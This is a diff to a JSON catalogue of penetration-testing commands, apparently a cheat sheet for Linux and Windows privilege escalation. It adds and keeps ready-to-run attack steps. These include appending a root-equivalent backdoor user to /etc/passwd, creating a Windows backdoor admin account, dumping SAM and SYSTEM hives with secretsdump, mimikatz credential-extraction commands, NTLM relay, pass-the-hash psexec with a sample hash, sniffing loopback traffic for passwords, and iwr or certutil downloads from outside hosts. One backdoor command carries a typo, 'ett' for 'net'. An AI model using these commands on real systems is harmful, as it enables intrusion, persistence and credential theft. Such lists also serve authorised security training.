@@ -76,89 +76,287 @@
   ],
   "commands": [
     {
-      "Name": "net",
-      "Category": 17,
-      "Description": "Create a windows backdoor admin account",
-      "Command": "net user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add"
+      "Name": "Check User ID",
+      "Category": 9,
+      "Description": "Enumerate current user ID, groups, and privileges to identify initial access level and potential escalation paths in a compromised Linux environment.",
+      "Command": "id"
     },
     {
-      "Name": "schtasks",
+      "Name": "Get Hostname",
+      "Category": 0,
+      "Description": "Retrieve the system's hostname for mapping the target during initial reconnaissance in privilege escalation assessments.",
+      "Command": "hostname"
+    },
+    {
+      "Name": "Read Issue Banner",
+      "Category": 0,
+      "Description": "Display the login banner from /etc/issue to gather OS and environment details passively for targeted Linux priv-esc planning.",
+      "Command": "cat /etc/issue"
+    },
+    {
+      "Name": "OS Release Info",
+      "Category": 0,
+      "Description": "Extract distribution and version information from /etc/os-release to identify potential vulnerabilities and exploit compatibility in Linux systems.",
+      "Command": "cat /etc/os-release"
+    },
+    {
+      "Name": "Kernel Details",
+      "Category": 0,
+      "Description": "Output kernel version, architecture, and build details via uname to scout for known kernel exploits during passive mapping.",
+      "Command": "uname -a"
+    },
+    {
+      "Name": "Process List",
+      "Category": 7,
+      "Description": "List all running processes with user details to identify running services, potential injection points, and privilege mismatches for escalation.",
+      "Command": "ps aux"
+    },
+    {
+      "Name": "Route List",
+      "Category": 3,
+      "Description": "Display routing table interactively to map network topology and identify lateral movement opportunities in a Linux target.",
+      "Command": "routel"
+    },
+    {
+      "Name": "IP Addresses",
+      "Category": 3,
+      "Description": "Enumerate all network interfaces and IP configurations for interactive network mapping and pivot identification in priv-esc chains.",
+      "Command": "ip a"
+    },
+    {
+      "Name": "Socket Status",
+      "Category": 7,
+      "Description": "Scan active network sockets and associated processes to detect listening services and connections for service enumeration in escalation.",
+      "Command": "ss -anp"
+    },
+    {
+      "Name": "IPTables Rules",
+      "Category": 14,
+      "Description": "Dump IPv4 firewall rules to assess network restrictions and potential bypasses in a Linux post-exploitation scenario.",
+      "Command": "cat /etc/iptables/rules.v4"
+    },
+    {
+      "Name": "Cron Directories",
+      "Category": 9,
+      "Description": "List cron job directories and files to uncover scheduled tasks that may allow privilege escalation via writable cron entries.",
+      "Command": "ls -lah /etc/cron*"
+    },
+    {
+      "Name": "User Crontab",
+      "Category": 9,
+      "Description": "Display current user's crontab entries to identify automated jobs exploitable for persistent or elevated access in Linux environments.",
+      "Command": "crontab -l"
+    },
+    {
+      "Name": "Installed Packages",
+      "Category": 1,
+      "Description": "List all installed Debian packages to analyze application versions for known vulnerabilities in priv-esc reconnaissance.",
+      "Command": "dpkg -l"
+    },
+    {
+      "Name": "Writable Dirs",
+      "Category": 9,
+      "Description": "Find world-writable directories across the filesystem to locate upload points for malicious payloads in post-exploitation.",
+      "Command": "find / -writable -type d 2>/dev/null"
+    },
+    {
+      "Name": "Mount Points",
+      "Category": 9,
+      "Description": "Examine filesystem mount table to identify mounted volumes, shares, and potential noexec bypasses for escalation techniques.",
+      "Command": "cat /etc/fstab"
+    },
+    {
+      "Name": "Block Devices",
+      "Category": 9,
+      "Description": "List block devices and partitions to map storage layout and detect encrypted or hidden volumes in Linux priv-esc.",
+      "Command": "lsblk"
+    },
+    {
+      "Name": "Loaded Modules",
+      "Category": 9,
+      "Description": "Enumerate loaded kernel modules to spot drivers vulnerable to exploits or version-specific weaknesses.",
+      "Command": "lsmod"
+    },
+    {
+      "Name": "Module Info",
+      "Category": 14,
+      "Description": "Query details on the libata kernel module to assess for storage-related exploits in targeted priv-esc paths.",
+      "Command": "/sbin/modinfo libata"
+    },
+    {
+      "Name": "SUID Binaries",
+      "Category": 9,
+      "Description": "Locate setuid executables system-wide to identify privilege escalation vectors via misconfigured SUID files.",
+      "Command": "find / -perm -u=s -type f 2>/dev/null"
+    },
+    {
+      "Name": "Environment Vars",
+      "Category": 9,
+      "Description": "Dump environment variables to reveal paths, credentials, or configs exploitable for further escalation in Linux shells.",
+      "Command": "env"
+    },
+    {
+      "Name": "Sudo Permissions",
+      "Category": 8,
+      "Description": "List allowed sudo commands to scout for misconfigurations enabling initial privilege escalation attempts.",
+      "Command": "sudo -l"
+    },
+    {
+      "Name": "Root Shell",
+      "Category": 8,
+      "Description": "Attempt interactive root shell via sudo for direct privilege escalation if permissions allow.",
+      "Command": "sudo -i"
+    },
+    {
+      "Name": "Monitor Processes",
+      "Category": 9,
+      "Description": "Continuously watch processes for user related activity during post-exploitation sniffing.",
+      "Command": "watch -n 1 \"ps -aux | grep '\\['\""
+    },
+    {
+      "Name": "Sniff Loopback",
+      "Category": 9,
+      "Description": "Use sudo to capture and grep loopback traffic for plaintext passwords in local inter-process communications.",
+      "Command": "sudo tcpdump -i lo -A | grep \"pass\""
+    },
+    {
+      "Name": "Cron Logs",
+      "Category": 9,
+      "Description": "Search syslog for cron execution logs to correlate scheduled jobs with potential escalation timestamps.",
+      "Command": "grep \"CRON\" /var/log/syslog"
+    },
+    {
+      "Name": "Add Backdoor User",
+      "Category": 9,
+      "Description": "Append a new root-equivalent user to /etc/passwd for persistent backdoor access post-privilege escalation.",
+      "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd"
+    },
+    {
+      "Name": "File Capabilities",
+      "Category": 9,
+      "Description": "Recursively enumerate file capabilities to uncover binaries with elevated privileges without traditional SUID.",
+      "Command": "/usr/sbin/getcap -r / 2>/dev/null"
+    },
+    {
+      "Name": "Kernel Version",
+      "Category": 0,
+      "Description": "Extract kernel release version for passive identification of exploitable kernel flaws in Linux mapping.",
+      "Command": "uname -r"
+    },
+    {
+      "Name": "System Arch",
+      "Category": 0,
+      "Description": "Determine system architecture to tailor exploits and payloads for architecture-specific vulnerabilities.",
+      "Command": "arch"
+    },
+    {
+      "Name": "File Type Check",
+      "Category": 14,
+      "Description": "Identify file type of a test file to verify binaries or scripts for exploitation in misc Linux priv-esc tasks.",
+      "Command": "file test-file"
+    },
+    {
+      "Name": "Reg",
+      "Category": 17,
+      "Description": "Save SAM and SYSTEM files",
+      "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2"
+    },
+    {
+      "Name": "SC",
+      "Category": 17,
+      "Description": "List all services that aren't in the System32 directory",
+      "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\""
+    },
+    {
+      "Name": "NET",
+      "Category": 17,
+      "Description": "Create a windows backdoor admin account",
+      "Command": "ett user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add"
+    },
+    {
+      "Name": "SCHTASKS",
       "Category": 17,
       "Description": "List all scheduled tasks that have executables under C:\\Users*",
       "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }"
     },
     {
-      "Name": "wmic",
+      "Name": "WMIC",
       "Category": 17,
       "Description": "List all services that have unquoted paths",
       "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }'"
     },
     {
-      "Name": "iwr",
-      "Category": 17,
+      "Name": "Powershell",
+      "Category": 15,
       "Description": "Download file to windows",
       "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file"
     },
     {
-      "Name": "certutil",
+      "Name": "Certutil",
       "Category": 17,
       "Description": "Download file to windows",
       "Command": "certutil -UrlCache -f http://host.com/file .\\file"
     },
     {
-      "Name": "netstat",
+      "Name": "NetStat",
       "Category": 17,
       "Description": "List all active network connections and listening ports",
       "Command": "netstat -ano"
     },
     {
-      "Name": "route",
+      "Name": "Route",
       "Category": 17,
       "Description": "Display the routing table, which contains all routes of the system",
       "Command": "route print"
     },
     {
-      "Name": "systeminfo",
+      "Name": "SystemInfo",
       "Category": 17,
       "Description": "Display windows system information",
       "Command": "systeminfo"
     },
     {
-      "Name": "impacket-ntlmrelayx",
+      "Name": "Impacket-secretsdump ",
+      "Category": 9,
+      "Description": "Dump hashes from sam and system files",
+      "Command": "impacket-secretsdump -sam sam -system system local"
+    },
+    {
+      "Name": "Impacket-ntlmrelayx",
       "Category": 9,
       "Description": "Execute ntlm smb relay attack",
       "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'"
     },
     {
-      "Name": "impacket-psexec",
+      "Name": "Impacket-psexec",
       "Category": 9,
       "Description": "Execute psexec on remote machine using NTLM hash",
       "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212"
-    },  
+    },
     {
-      "Name": "mimikatz",
+      "Name": "Mimikatz",
       "Category": 16,
       "Description": "Elevate to SYSTEM user privileges",
       "Command": "token::elevate"
-    },        
+    },
     {
-      "Name": "mimikatz",
+      "Name": "Mimikatz",
       "Category": 16,
       "Description": "Enable SeDebugPrivilege access right",
       "Command": "privilege::debug"
-    },    
+    },
     {
-      "Name": "mimikatz",
+      "Name": "Mimikatz",
       "Category": 16,
       "Description": "Extract the NTLM hashes from the SAM",
       "Command": "lsadump::sam"
-    },  
+    },
     {
-      "Name": "mimikatz",
+      "Name": "Mimikatz",
       "Category": 16,
       "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
       "Command": "sekurlsa::logonpasswords"
-    },    
+    },
     {
       "Name": "Powershell",
       "Category": 15,
@@ -262,13 +460,13 @@
       "Command": "Test-NetConnection -Port 25 192.168.50.8"
     },
     {
-      "Name": "Start System Service",
+      "Name": "SystemCTL",
       "Category": 9,
       "Description": "Starts a specified service using systemctl",
       "Command": "sudo systemctl start servicename"
     },
     {
-      "Name": "Nmap Vulnerability Scan",
+      "Name": "Nmap",
       "Category": 5,
       "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
       "Command": "nmap --script vuln -p 80,443 192.168.192.13"
